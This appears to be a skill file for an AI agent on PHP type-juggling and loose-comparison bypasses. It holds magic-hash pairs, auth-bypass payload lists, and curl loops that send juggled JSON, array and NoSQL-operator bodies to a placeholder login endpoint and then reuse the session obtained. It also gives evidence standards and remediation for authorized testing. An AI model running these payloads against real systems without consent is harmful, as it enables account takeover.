---
name: type-juggling
description: >-
  PHP type juggling and weak comparison (`==`) bypass. Use when authentication, HMAC/signature checks, or token validation uses loose equality, numeric coercion, or hash comparisons without strict types — common in legacy PHP and CTF-style code paths.
---

# SKILL: PHP Type Juggling — Weak Comparison & Magic Hash Bypass

> **AI LOAD INSTRUCTION**: PHP `==` coercion, magic hashes (`0e…`), HMAC/hash loose checks, NULL from bad types, and CTF-style `strcmp` / `json_decode` / `intval` tricks. Use strict routing: map the sink (`==` vs `hash_equals`), PHP major version, and whether both operands are attacker-controlled. Routing note: when you encounter PHP login/signature logic or code like `md5($_GET['x'])==md5($_GET['y'])`, start with this skill; if `hash_equals`/`===` is already used, this path usually does not apply.

## 0. QUICK START

**First-pass goal**: prove the server branch treats unequal secrets/tokens as equal via coercion, not guess the real password.

### First-pass payloads (auth / token shape)

```text
password[]=x
password=
0
0e12345
240610708
QNKCDZO
true
[]
{"password":true}
admin%00
```

### Minimal PHP probes (local or `php -r` in lab)

```php
<?php
// Loose compare probes — run in target PHP major version if possible
var_dump('0e123' == '0e999');
var_dump('123a' == 123);
var_dump(md5('240610708') == md5('QNKCDZO'));
```

### Routing hints

| Clue | Next step |
|---|---|
| Source code uses `==` to compare passwords, tokens, or HMAC values | Go to Sections 1-3 |
| `md5($a) == md5($b)` or loose `sha1` comparison | Section 2 magic hashes |
| `hash_hmac(...) != '0'` or compared with `"0"` | Section 3 |
| `strcmp`、`json_decode(..., true)`、`intval` | Section 5 |

---

## 1. LOOSE COMPARISON (`==`) — TRUTH TABLE & VERSIONS

PHP compares operands with type juggling unless you use `===` or `hash_equals()` for secrets.

### 1.1 Core examples (strings vs numbers)

| Expression | Result | Mechanism (short) |
|---|---|---|
| `'0010e2' == '1e3'` | **true** | Both strings look numeric → compared as **floats**; both parse to **1000.0** (not zero — common exam trap; see next row for real “both zero”) |
| `'0e462097431906509019562988736854' == '0e830400451993494058024219903391'` | **true** | Both parse as **0.0** in scientific notation |
| `'123a' == 123` | **true** | String cast to int stops at first non-digit → `123` |
| `'abc' == 0` | **true** (PHP **7.x and earlier**) | Non-numeric string compared to int → string becomes `0` |
| `'' == 0` | **true** | Empty string → `0` |
| `'' == false` | **true** | both “falsy” in loose rules |
| `false == NULL` | **true** | loose equality |
| `0 == false` | **true** | loose equality |
| `'' == 0 == false == NULL` | **true** (chain) | Each adjacent pair is **true** under `==` (`''==0`, `0==false`, `false==NULL`) — classic “falsy” chain |
| `'0' == false` | **true** | String `'0'` is the **only** non-empty string that compares as false to boolean |
| `'php' == 0` | **false** (PHP **8+**) | PHP 8: non-numeric string **no longer** equals `0` |

### 1.2 PHP 5 vs 7 vs 8 (high-signal deltas)

| Topic | PHP 5.x / 7.x (typical) | PHP 8.0+ |
|---|---|---|
| `0 == "foo"` | **true** (string → 0) | **false** |
| String-to-number for `"123a"` | Still truncates for `(int)` / numeric compare in many `==` paths | Same idea for numeric strings; **non-numeric** vs int fixed as above |
| `md5([])` / `sha1([])` | May warn / `NULL`-like behavior in older patterns | **TypeError** for wrong types — kills classic `[]` tricks unless error handling collapses to NULL |

**Tester takeaway**: always note **PHP version** from headers, `X-Powered-By`, or fingerprint; a payload that works on PHP 7 may fail on PHP 8.

### 1.3 Safe alternative (defense / verification)

```php
hash_equals((string)$expected, (string)$actual);  // timing-safe, strict string
// or
$expected === $actual;
```

---

## 2. MAGIC HASHES (`0e…` + digits only)

When both sides are **hex-looking hash strings** that match `^0e[0-9]+$`, PHP treats them as **floats in scientific notation** → value **0.0**. Then `md5(A) == md5(B)` is **true** even though digests differ as strings.

### 2.1 Reference table (MD5 / SHA-1 and longer algos)

| Algorithm | Example input | Digest (starts with `0e` + all decimal digits) |
|---|---|---|
| **MD5** | `240610708` | `0e462097431906509019562988736854` |
| **MD5** | `QNKCDZO` | `0e830400451993494058024219903391` |
| **SHA-1** | `10932435112` | `0e07766915004133176347055865026311692244` |
| **SHA-224** | *(brute-force / precomputed)* | Example form: `0e` + decimal digits only → `==` with another such string is true |
| **SHA-256** | *(brute-force / precomputed)* | Same pattern: only strings matching `^0e\d+$` collide under `==` |

**Why it works**: `md5('240610708') == md5('QNKCDZO')` → both sides match `^0e[0-9]+$` → both interpreted as **0.0 == 0.0** → **true**.

### 2.2 Exploit pattern in code

```php
if (md5($_GET['a']) == md5($_GET['b']) && $_GET['a'] != $_GET['b']) {
    // intended: different strings, same md5 (impossible for md5)
    // actual: two different strings whose *digests* are magic hashes
}
```

### 2.3 Payload sketch (pair hunting)

```text
?a=240610708&b=QNKCDZO
```

For SHA-224/256, treat as **search problem**: brute-force inputs until digest matches `^0e\d+$`; pair two distinct inputs. Longer hashes = harder; MD5/SHA1 examples above are the usual teaching set.

---

## 3. HMAC BYPASS (LOOSE COMPARE VS `"0"` OR `0`)

If logic uses **loose** inequality against a constant:

```php
if (hash_hmac('md5', $data, $key) != '0') { /* ok */ }
// or == 0, == false with string "0e...", etc.
```

Brute-force **`$data`** (e.g. timestamp, nonce, counter) until `hash_hmac` output matches **`^0e[0-9]+$`** (for MD5 output) or the code’s specific loose rule — then the hash may compare equal to `0` or to another magic digest under `==`.

### Example (MD5-style `0e` digest for a numeric message)

| Concept | Example |
|---|---|
| Message type | Unix timestamp, incrementing id, millisecond clock |
| Timestamp brute-force pattern | Tutorials sometimes cite `1539805986` → `0e772967136366835494939987377058` as a **magic-hash style** example; **`md5('1539805986')` does not yield that digest** in stock PHP — use the idea (scan timestamps / counters until output matches `^0e[0-9]+$`) and **always verify against the exact function + key** in the target code. |
| Goal | Find `$data` such that `hash_hmac('md5', $data, $key)` matches `^0e[0-9]+$` |
| Note | Without knowing `$key`, you may still brute **`$data`** if algorithm/output are visible in a oracle; CTFs often leak or fix key |

```text
# Conceptual: try many timestamps
for t in range(T0, T1):
    if re.fullmatch(r'0e\d+', hmac_md5(str(t), key)):
        use t
```

**Mitigation**: `hash_equals($mac, $expected)` + fixed-length hex/binary encoding; never compare HMAC to bare `"0"`.

---

## 4. NULL JUGGLING (ARRAYS & TYPE ERRORS)

Invalid types can yield **`NULL`** on the compared side; loose equality to another `NULL` or coerced value may pass.

| Call | Typical PHP 7/8 behavior |
|---|---|
| `md5([])` | PHP 8: **TypeError**; older: warnings / not reliable across versions |
| `sha1([])` | Same |
| **Idea** | If error handler or custom wrapper converts failures to **`NULL`**, then `NULL == NULL` or `NULL == sha1("x")` if other side is also NULL |

```php
// CTF / broken code mental model:
@sha1($_GET['x']) == @sha1($_GET['y']);  // if both error to NULL → true
```

**Real audits**: look for **`@`**, custom `try/catch` that sets hash to `null`, or user input passed where a string is required.

---

## 5. CTF PATTERNS

### 5.1 `strcmp` / `strcasecmp` with arrays

```php
strcmp([], "password");  // NULL in PHP 7/8 (invalid args)
// NULL == 0  → true in loose compare if code does:
if (strcmp($_GET['p'], $secret) == 0)
```

Payload:

```text
?p[]=1
```

### 5.2 `intval` bypass

```php
// Hex: base 0 lets PHP interpret 0x prefix (version-dependent; always verify)
intval("0x1A", 0);   // → 26

// Octal: leading 0 can be parsed as octal with base 0
intval("010", 0);  // → 8 (classic teaching example; confirm on target PHP)

// Scientific notation: intval() alone stops at 'e'; cast via float first
intval((float) "1e2"); // → 100
```

```text
?id=0x1A
?id=010
?id=1e2
```

### 5.3 `json_decode` + `true` for associative array auth

```json
{"password": true}
```

```php
$j = json_decode($input, true);
if ($j['password'] == $stored_string) // true == "nonempty" often true — see PHP loose rules
```

### 5.4 `is_numeric` + loose compare

```php
is_numeric("0e12345");  // true
"0e12345" == 0;         // true (scientific notation → 0.0)
```

### 5.5 Deserialization + magic properties

Unserialize user input into objects whose `__toString` or properties feed into `md5($obj)` or loose compare — combine with **magic hash** strings on properties (CTF). Look for `unserialize($_…)` near `==` on hashes.

---

## 6. DECISION TREE

```text
                         +------------------+
                         | PHP loose compare|
                         | or hash == hash? |
                         +--------+---------+
                                  |
                    +-------------+-------------+
                    |                           |
             +------v------+             +------v------+
             | Uses === or |             | Uses == or   |
             | hash_equals |             | strcmp == 0  |
             +------+------+             +------+-------+
                    |                           |
               STOP (likely)              +-----v-----+
                                          | Operand   |
                                          | types?    |
                                          +-----+-----+
                           +--------------+---+--------------+
                           |              |                  |
                    +------v------+ +-----v-----+    +-------v--------+
                    | Both numeric| | One int & |    | Hash digests   |
                    | strings 0e… | | one string|    | both 0e\d+ ?   |
                    +------+------+ +-----+-----+    +-------+--------+
                           |              |                  |
                      MAGIC HASH    STRING/INT           MAGIC HASH
                      COLLISION     JUGGLING             (md5/sha1/…)
                           |              |                  |
                           +------+-------+------------------+
                                  |
                           +------v------+
                           | HMAC / MAC  |
                           | vs "0"      |
                           +------+------+
                                  |
                           brute $data
                           for 0e… digest
                                  |
                           +------v------+
                           | Arrays /    |
                           | json true / |
                           | strcmp([])  |
                           +-------------+
```

### Tool references

| Tool | Use |
|---|---|
| Local `php` CLI | Reproduce `==` behavior for target major version |
| Static code review | Grep `==`, `!=` on crypto outputs; find missing `hash_equals` |
| CTF frameworks | Payload generators for magic hashes and `0e` search |

---

**Safety & scope**: Use only on **authorized** targets (CTF, lab, written permission). This skill explains **language semantics** for defense and assessment — not a license to attack systems without consent.

---

## 7. TOOL REFERENCES AND LAB HARNESS

Everything in this skill is testable locally. Run the comparison matrix against a local PHP/IPython
before touching a target, so you know what the answer should look like.

```bash
# the language versions that matter, and how to get them locally
php -v                       # PHP 5 vs 7 vs 8 change the loose-comparison result materially
php8 -v; php7.4 -v           # side-by-side, the fastest way to see a version delta
python3 -c "import sys; print(sys.version)"
node -e "console.log(process.version)"

# the one-liners used to build the truth tables in section 1
php -r 'var_dump("0e123" == "0e456"); var_dump("1e2" == "100"); var_dump(0 == "a");'
php -r 'var_dump(in_array("0", ["a","b"]));'            # pre-8 in_array juggling
php -r 'var_dump(strcmp([], "x"));'                     # array-to-string warning, both eras
php -r 'var_dump(json_decode("{\"a\":1}", true));'      # the assoc-array path
node -e 'console.log(JSON.parse("{\"a\":1}"))'

# magic-hash pair hunting is a brute-force over a digest form, and it is cheap
python3 - <<'PY'
import hashlib, itertools, string
# find two strings whose MD5 is 0e followed by digits only
FOUND = []
seen = 0
for n in itertools.count():
    s = "hunter%d" % n
    d = hashlib.md5(s.encode()).hexdigest()
    seen += 1
    if d.startswith("0e") and d[2:].isdigit():
        FOUND.append((s, d)); print("MD5 magic:", s, d)
        if len(FOUND) >= 3: break
    if seen > 30_000_000: print("stopped after", seen); break
print("searched:", seen)
print("NOTE: the two well-known public values are '240610708' and 'QNKCDZO' for MD5,")
print("      and 'aaroZmOk' / 'aaK1STfY' for SHA-1. Verify them yourself rather than trusting the list.")
PY

# the local harness: a vulnerable snippet and a safe snippet, side by side
cat > /tmp/juggle.php <<'PHP'
<?php
function vuln($a)  { return $a == "0"; }          // loose: "0e123" passes
function safe($a)  { return $a === "0"; }         // strict: only the string "0" passes
function vulnHash($a,$b){ return md5($a) == md5($b); }   // magic-hash passes
foreach (["0","0e123","0e456","abc","", "0.0", []] as $v) {
    printf("%-8s vuln=%-5s safe=%-5s\n", var_export($v, true),
           var_export(vuln($v), true), var_export(safe($v), true));
}
echo "magic pair: ", var_export(vulnHash("240610708","QNKCDZO"), true), "\n";
PHP
php /tmp/juggle.php
```

| Tool | Purpose | Note |
|---|---|---|
| `php -r` / `php -a` | the comparison truth table, version-accurate | the only reliable source for a version delta |
| `phpbrew` / `docker run php:7.4-cli` | run two PHP versions side by side | the version delta is the point |
| a JSON-aware client (`curl -d`, Burp, `requests`) | send **real** JSON types rather than strings | string-only clients cannot test type juggling at all |
| `python3` + `hashlib` | magic-hash and HMAC pair hunting | verify the public pairs, do not memorise them |
| a local proxy | confirm what the backend **received**, not what you sent | the type may change in the client |

**The version is part of the finding.** A loose-comparison result is only meaningful next to the PHP or
Node version that produced it, and a JSON string can never test a type juggle.

---

## 8. EXECUTION PRIMITIVES

Type juggling needs **two measurements**: what the comparison does with your input, and whether that
difference is observable from outside. A truth table is not a finding until one of its rows changes
an outcome.

### 8.1 Establish a control pair before testing

```bash
# the same request twice: once with a value that MUST fail, once with one that MUST succeed.
# anything you conclude later is relative to these two rows.
curl -sS -o /tmp/neg -w 'neg %{http_code} %{size_download}\n' -X POST "https://target.tld/api/login" \
  -H 'Content-Type: application/json' -d '{"user":"admin","pass":"definitely-wrong-9f2a"}'
curl -sS -o /tmp/pos -w 'pos %{http_code} %{size_download}\n' -X POST "https://target.tld/api/login" \
  -H 'Content-Type: application/json' -d "{\"user\":\"admin\",\"pass\":\"$KNOWN_GOOD\"}"
diff <(cat /tmp/neg) <(cat /tmp/pos) | head -20
```

Without a known-good and a known-bad request, a response difference means nothing. **Every claim below
is a differential against these two.**

### 8.2 The comparison matrix, sent as real JSON types

```bash
# the whole point of type juggling: the SAME key, different JSON TYPES
for BODY in \
  '{"pass":0}' \
  '{"pass":true}' \
  '{"pass":[]}' \
  '{"pass":["x"]}' \
  '{"pass":{}}' \
  '{"pass":{"$ne":null}}' \
  '{"pass":"0"}' \
  '{"pass":"0e123"}' \
  '{"pass":"0e999999999999999"}' \
  '{"pass":null}' \
  '{"pass":1}' \
  '{"pass":-1}' ; do
  C=$(curl -sS -o /tmp/j -w '%{http_code}' -X POST "https://target.tld/api/login" \
        -H 'Content-Type: application/json' -d "$BODY")
  printf '%-32s %s  %s\n' "$BODY" "$C" "$(head -c 90 /tmp/j | tr -d '\n')"
done
```

A row that behaves like the **known-good** row rather than the known-bad row is the finding. Watch for
`0`, `true`, and `[]` - in a loose comparison against a numeric or boolean column they pass. An array
against a string comparison produces an error in some stacks and a truthy result in others.

### 8.3 JSON `null` and missing-key behaviour

```bash
for BODY in '{"pass":null}' '{}' '{"pass":""}' '{"pass":[]}'; do
  C=$(curl -sS -o /tmp/n -w '%{http_code}' -X POST "https://target.tld/api/login" \
        -H 'Content-Type: application/json' -d "$BODY")
  echo "$BODY -> $C $(head -c 80 /tmp/n | tr -d '\n')"
done
```

A query that compares a `null` field to a supplied `null` matches records **where the field is absent** -
a real bypass in NoSQL backends and in ORMs that translate `nil` into an `IS NULL` predicate. Confirm
with a field you know is unset.

### 8.4 PHP magic-hash verification, done by measurement

```bash
# a PHP <8 comparison: two DIFFERENT strings that are both '0e' + digits compare equal
python3 - <<'PY'
import itertools, hashlib, re
# enumerate common magic-hash candidates; the pair must be DIFFERENT strings, SAME numeric value
cands = ["240610708","QNKCDZO","aabg7XSs","aabC9RqS","s878926199a","s155964671a",
         "0e462097431906509019562988736854","0e830400451993494058024219903391"]
for s in cands:
    h = hashlib.md5(s.encode()).hexdigest()
    if re.fullmatch(r'0e\d+', h): print("md5  magic:", s, h)
    h2 = hashlib.sha1(s.encode()).hexdigest()
    if re.fullmatch(r'0e\d+', h2): print("sha1 magic:", s, h2)
PY
# then: send one as the known-good value, and the OTHER as the guess. If login succeeds, it is PHP <8 loose compare.
curl -sS -o /tmp/m1 -w '%{http_code}\n' -X POST "https://target.tld/api/login" \
  -H 'Content-Type: application/json' -d '{"user":"admin","pass":"240610708"}'
```

The magic-hash class only exists where the comparison is loose **and** the stored hash is compared as a
string. Modern PHP compares hashes with `hash_equals` and this entire class is gone - **verify the
runtime** before reporting it (8.8).

### 8.5 HMAC and signature comparison bypass

```bash
# a MAC verified with == instead of a constant-time compare, against a numeric-ish expected value
for SIG in "0" "0e123" "" "[]" "0.0"; do
  C=$(curl -sS -o /tmp/h -w '%{http_code}' "https://target.tld/api/data?data=1&sig=$SIG")
  printf 'sig=%-8s %s  %s\n' "$SIG" "$C" "$(head -c 70 /tmp/h | tr -d '\n')"
done
# and with the signature omitted entirely (a missing key often compares as null)
curl -sS -o /tmp/h2 -w 'nosig %{http_code} %{size_download}\n' "https://target.tld/api/data?data=1"
```

An empty or absent signature that passes is a **missing-check** finding, not juggling - and it is
worth more. Record which of the two it is.

### 8.6 Structural juggling: arrays, objects, and repeated keys

```bash
# repeated parameters: PHP and some frameworks take the LAST, others the FIRST
curl -sS -o /tmp/rp -w '%{http_code}\n' -X POST "https://target.tld/api/login" \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'user=admin&pass=wrong&pass=KNOWN_GOOD'
# array injection into a scalar comparison
curl -sS -o /tmp/arr -w '%{http_code}\n' -X POST "https://target.tld/api/login" \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'user[]=admin&pass[]=x'
# and the JSON forms
curl -sS -o /tmp/jarr -w '%{http_code}\n' -X POST "https://target.tld/api/login" \
  -H 'Content-Type: application/json' -d '{"user":["admin"],"pass":["x"]}'
head -c 120 /tmp/rp /tmp/arr /tmp/jarr
```

Parameter pollution and array injection are the structural half of juggling: the parser that reads the
last value, and the app that reads the first, are a **parser differential** you can exploit for a
bypass even when no loose comparison exists.

### 8.7 Numeric and string boundary behaviour

```bash
for V in "0" "00" "000000" "-0" "0.0" "1e0" "0x0" "0b0" " 0" "0 " "0\n" "٤" "１"; do
  C=$(curl -sS -o /tmp/nb -w '%{http_code}' -X POST "https://target.tld/api/verify" \
        -H 'Content-Type: application/json' -d "{\"code\":\"$V\"}")
  printf 'code=%-10s %s\n' "'$V'" "$C"
done
```

Leading-zero, hex, scientific, and Unicode-digit forms are parsed as zero by some decoders and as a
string by others. A row that passes is the finding; **note which form passed**, because that is the
bypass an attacker will use and the fix must cover.

### 8.8 Runtime and backend verification

```bash
# which stack are you actually testing? the juggling class depends on it entirely
curl -sS -D- -o /dev/null "https://target.tld/" | grep -iE '^(server|x-powered-by|set-cookie)'
curl -sS "https://target.tld/" | grep -oiE 'php|laravel|symfony|express|django|rails|spring|asp\.net' | sort -u | head
# error-shape probing: the error text names the engine
curl -sS -X POST "https://target.tld/api/login" -H 'Content-Type: application/json' -d '{"pass":{"a":1}}' | head -c 300
```

**PHP 8 and later, and every modern strict-typed stack, removed the loose-comparison class.** Reporting
a magic hash against a Node or PHP 8 backend is a false positive; the runtime check is not optional.

### 8.9 Verify the business effect, not just the status code

```bash
# a 200 is not an effect. Follow the bypass through to something the negative control could not do.
curl -sS -c /tmp/jar -o /tmp/lo -X POST "https://target.tld/api/login" \
  -H 'Content-Type: application/json' -d '{"user":"admin","pass":0}'
grep -cE 'session|token|auth' /tmp/jar /tmp/lo
# then use whatever came back
curl -sS -b /tmp/jar "https://target.tld/api/me" | head -c 200
```

The bypass is real when the resulting session or token **does something the negative control could
not**. Otherwise you have a difference in response shape, not an authentication bypass.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the juggled request behave like the **known-good** request, not merely differently from the known-bad? | difference is not equality; you need the success-shaped outcome |
| 2 | Is the runtime one where loose comparison exists (PHP < 8, untyped comparisons, a loose database query)? | the whole class depends on the engine |
| 3 | Did the bypass produce a **usable artefact** - a session, a token, a record you could not read? | the effect, not the status code |
| 4 | Is the value **attacker-supplied** and reaching the comparison, rather than a constant? | otherwise it is a backend quirk you cannot influence |
| 5 | Is the observed behaviour **reproducible** on repeated requests with the same body? | some differences are timing or state, not logic |
| 6 | Have you ruled out that the endpoint accepts *any* value (a stub or a mock)? | the positive control must still be required |
| 7 | Is the input a **type** difference (JSON number/array/null) rather than a string trick? | the type difference is what makes it juggling rather than a weak password |

**A truth-table difference is a lead.** The finding is a row of that table that authenticates,
authorizes, or verifies when it should not, confirmed by the artefact it produced.

---

## 10. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **exact request bodies** for the negative control, the positive control, and the bypass | a differential claim needs all three, or it is not measurable |
| The **response** for each, showing the bypass matching the positive control | the comparison, in raw form |
| The **artefact produced** (session cookie, token, the record returned) and what it could do | converts a response difference into an impact |
| The **runtime and version** evidence (`Server`, `X-Powered-By`, error shape) | the class is runtime-dependent; without this the finding is unverifiable |
| The **parser or decoder** that produced the type (JSON number, form array, repeated key) | the fix target, and the reason it works |
| The **form that passed** (`0`, `0e…`, `[]`, `null`) quoted exactly | the fix must cover the specific form, not "input validation" generically |
| **Reproducibility** - the same bypass run three times | rules out a transient state difference |
| A statement of what the bypass **did not** achieve | honest scope; a 200 without a session is weaker |
| The **negative control proving the check exists** - a wrong value is rejected | proves you bypassed a control rather than found one missing |
| Where the check is missing entirely, the report says so | a missing signature check is a different, often more serious finding than juggling |

Report the **row and the effect**: "`POST /api/login` with `{"user":"admin","pass":0}` returns a valid
`session` cookie while `{"pass":"wrong"}` does not; the successful response is byte-identical to the
known-good login and the cookie grants access to `/api/me`; the stack is PHP 7.4 per the
`X-Powered-By` header and the loose-comparison error shape, which is the condition that makes it
work", never "the application is vulnerable to type juggling".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A magic hash against PHP 8, Node, or any strict-comparison stack | the class does not exist there |
| A response that differs in shape but grants nothing | no artefact, no bypass |
| A field you cannot influence, comparing internal values | not attacker-controlled |
| A `200` from an endpoint that returns `200` for everything | no differential |
| An endpoint that never had a check, so "any value works" | a missing check, not juggling - report it as such |
| `null` accepted because the field is optional | intended behaviour |
| A truth-table row derived in a lab, not measured against the target | the target's runtime is the variable |
| The same string sent twice returning different results | non-reproducible |
| An array causing a `500` | a crash is not a bypass unless it leaks or bypasses something |
| A bypass that requires `Content-Type` the client would not send | transport-level, weaker |
| An error message revealing the engine | fingerprinting, not exploitation |
| A code-execution claim from a comparison difference | unrelated; only claim what you measured |

**Measure the runtime and the artefact.** Without both, a truth-table row is an anecdote.

---

## 11. REMEDIATION REFERENCE

1. **Use strict comparison operators everywhere a security decision is made** - `===` in PHP, `is` in Python where identity matters, strict equality in JS, and typed comparisons in the query layer; the class exists only because of loose coercion.
2. **Compare secrets with a constant-time function** - `hash_equals` in PHP, `hmac.compare_digest` in Python, `crypto.timingSafeEqual` in Node; this removes both the juggling and the timing side channel.
3. **Declare types on every boundary and validate the shape** - JSON schema validation, typed DTOs, and framework-level type coercion reject a number where a string is expected, which is what makes an array or `null` payload reach the comparison at all.
4. **Normalise and reject structurally invalid input early** - repeated parameters, array-where-scalar, and object-where-string should be rejected by the router, not silently coerced by the backend.
5. **Upgrade runtimes that still have loose semantics** - PHP 8's comparison changes and modern ORM behaviour remove large parts of this class, and staying on an old runtime keeps them.
6. **Do not compare user input to a value that could be numeric-looking** - store and compare hashes as opaque strings with an explicit type, and never let a stored hash be interpreted as a number.
7. **Parameterise and type the database layer** - in NoSQL backends, reject operator objects (`$ne`, `$gt`) in user-supplied documents by validating the value type rather than the field name.
8. **Reject `null` and absent fields explicitly where they would match unintended records** - an `IS NULL` comparison against a supplied `null` is the mechanism behind a large share of NoSQL bypasses.
9. **Make the check verifiable in both directions** - a test that asserts a wrong type is rejected, and that a correct value still succeeds; a check that rejects everything breaks the service, not the attack.
10. **Enforce the content type and parse the body for it** - a JSON endpoint that also accepts form encoding invites the parser differential behind parameter-pollution bypasses.
11. **Log the type actually received, not just the value** - the detection signal for this class is a request whose value type is unexpected, and it is invisible in a value-only log.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [nosql-injection](../nosql-injection/SKILL.md) - where operator and `null` juggling reaches a database
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) - the signature and token comparisons this class defeats
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) - the structural half of the same parser differential
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) - the authentication bypass class this feeds
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) - coercion-driven logic gaps beyond authentication
